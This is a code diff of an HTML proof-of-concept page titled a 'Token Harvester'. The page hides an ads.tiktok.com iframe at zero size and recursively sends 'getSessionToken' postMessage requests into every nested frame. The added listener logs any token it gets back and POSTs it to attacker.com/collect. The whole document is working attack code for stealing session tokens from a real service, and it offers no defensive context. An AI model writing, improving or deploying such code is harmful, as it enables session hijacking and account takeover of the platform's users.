@@ -2,7 +2,7 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <title>Deep Frame Token Stealer</title>
+    <title>Recursive Frame Token Harvester</title>
 </head>
 <body>
     <iframe id="victim" src="https://ads.tiktok.com/app-center/apps/1234" style="width:0;height:0;border:0;"></iframe>
@@ -14,26 +14,38 @@
             iframe.onload = function () {
                 const outerFrame = iframe.contentWindow;
 
-                // Try outer frame first
-                outerFrame.postMessage({ action: 'getSessionToken' }, 'https://ads.tiktok.com');
-
-                // Try nested frames inside the iframe
-                setTimeout(() => {
-                    try {
-                        const innerFrame = outerFrame.frames[0]; // First nested frame
-                        if (innerFrame) {
-                            innerFrame.postMessage({ action: 'getSessionToken' }, 'https://ads.tiktok.com');
-                        }
-                    } catch (e) {
-                        console.error('Could not access nested frame:', e);
-                    }
-                }, 1000); // Give it some time to fully load nested frames
+                // Start recursive postMessage broadcast
+                broadcastToFrames(outerFrame);
             };
 
-            // Capture any token coming back from any frame
+            // Recursive function to go deep into nested frames
+            function broadcastToFrames(frame) {
+                try {
+                    // Send payload to current frame
+                    frame.postMessage({ action: 'getSessionToken' }, 'https://ads.tiktok.com');
+
+                    // Go deeper if there are nested frames
+                    if (frame.frames && frame.frames.length > 0) {
+                        for (let i = 0; i < frame.frames.length; i++) {
+                            broadcastToFrames(frame.frames[i]);
+                        }
+                    }
+                } catch (e) {
+                    console.warn('Cross-origin or inaccessible frame:', e);
+                }
+            }
+
+            // Listen for tokens coming from any frame
             window.addEventListener('message', (e) => {
-                if (e.origin === 'https://ads.tiktok.com') {
-                    console.log('Token received from nested frame:', e.data);
+                if (e.origin === 'https://ads.tiktok.com' && e.data) {
+                    console.log('🎯 Token received:', e.data);
+
+                    // Optional: Exfiltrate token to your server
+                    fetch('https://attacker.com/collect', {
+                        method: 'POST',
+                        mode: 'no-cors',
+                        body: JSON.stringify({ token: e.data })
+                    });
                 }
             });
         });
